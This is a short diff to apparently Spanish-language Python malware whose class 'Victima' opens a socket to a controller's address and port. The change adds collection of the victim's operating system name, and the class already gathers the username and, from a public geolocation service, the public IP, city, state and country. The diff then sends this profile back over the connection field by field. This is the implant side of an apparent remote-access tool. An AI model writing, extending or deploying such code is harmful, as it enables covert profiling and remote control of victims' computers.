@@ -7,6 +7,7 @@ import sys
 import time
 import socket
 import json
+import platform
 import subprocess
 import threading
 import urllib.request
@@ -50,7 +51,7 @@ class Victima(object):
 
 	def iniciar(self):
 		self.client.connect((self.direccion, self.puerto))
-		return
+		return	
 
 
 	def detener(self):
@@ -97,11 +98,12 @@ class Victima(object):
 
 
 	def obtener_informacion(self):
-		host = getuser()		
+		host = getuser()	
+		sistema = platform.system()	
 		url = urllib.request.urlopen("https://geoip-db.com/json")
 		objeto = json.loads(url.read().decode())
 		ip_info = objeto["city"] + "," + objeto["IPv4"] + "," + objeto["country_name"] + "," + objeto["state"]
-		return [host,ip_info]
+		return [host,sistema,ip_info]
 
 
 	def enviar_informacion(self):
@@ -109,6 +111,8 @@ class Victima(object):
 		self.enviar(informacion[0])
 		self.recibir()
 		self.enviar(informacion[1])
+		self.recibir()
+		self.enviar(informacion[2])
 		return	
 
 
